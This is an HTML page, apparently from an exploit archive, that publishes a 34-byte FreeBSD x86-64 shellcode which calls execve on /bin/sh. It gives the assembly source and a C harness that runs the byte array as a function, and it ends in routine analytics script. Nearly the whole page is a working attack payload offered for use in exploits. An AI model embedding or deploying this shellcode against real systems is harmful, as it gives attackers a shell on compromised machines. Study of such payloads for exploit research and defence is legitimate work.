<html><head><title>FreeBSD/x86-64 - execve /bin/sh shellcode 34 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
Anderson Eduardo &lt; c0d3_z3r0 &gt;
Hack'n Roll
http://anderson.hacknroll.com
http://blog.hacknroll.com 
 
.section .text
.globl _start
_start:
 

        xor %rcx,%rcx
        jmp string
 
        main:
 
        popq %rsi
        movq %rsi,%rdi
 
        pushq %rsi
        pushq %rcx
        movq %rsp,%rsi
 
        movq %rcx,%rdx
        movb $0x3b,%al
        syscall
 
        string:
        callq main
        .string &quot;/bin/sh&quot;
 

*/
 
int main(void)
{
char shellcode[] =
&quot;\x48\x31\xc9&quot;
&quot;\xeb\x10&quot;
&quot;\x5e&quot;
&quot;\x48\x89\xf7&quot;
&quot;\x56&quot;
&quot;\x51&quot;
&quot;\x48\x89\xe6&quot;
&quot;\x48\x89\xca&quot;
&quot;\xb0\x3b&quot;
&quot;\x0f\x05&quot;
&quot;\x48\xe8\xea\xff\xff\xff&quot;
&quot;\x2f&quot;
&quot;\x62&quot;
&quot;\x69&quot;
&quot;\x6e&quot;
&quot;\x2f&quot;
&quot;\x73\x68&quot;;
 
        (*(void (*)()) shellcode)();
 
//Hack'n Roll
 
return 0;
} 



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
